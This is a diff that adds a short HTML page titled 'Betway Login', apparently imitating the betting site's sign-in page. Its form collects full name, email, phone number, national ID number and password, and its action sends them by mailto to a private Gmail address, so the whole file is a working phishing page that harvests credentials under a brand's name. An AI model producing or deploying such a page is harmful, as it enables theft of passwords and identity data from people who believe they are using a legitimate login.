@@ -1,0 +1,25 @@
+<div class="container">
+  <h1>Betway Login</h1>
+  <form target="_blank" action="mailto:neomvelase018@gmail.com" method="POST">
+    <div class="form-group">
+      <div class="form-row">
+        <div class="col">
+          <input type="text" name="name" class="form-control" placeholder="Full Name" required>
+        </div>
+        <div class="col">
+          <input type="email" name="email" class="form-control" placeholder="Email Address" required>
+        </div>
+      </div>
+    </div>
+    <div class="form-group">
+      <input type="tel" name="phone" class="form-control" placeholder="Phone Number" required>
+    </div>
+    <div class="form-group">
+      <input type="text" name="id" class="form-control" placeholder="ID Number" required>
+    </div>
+    <div class="form-group">
+      <input type="password" name="password" class="form-control" placeholder="Password" required>
+    </div>
+    <button type="submit" class="btn btn-lg btn-dark btn-block">Submit Form</button>
+  </form>
+</div>
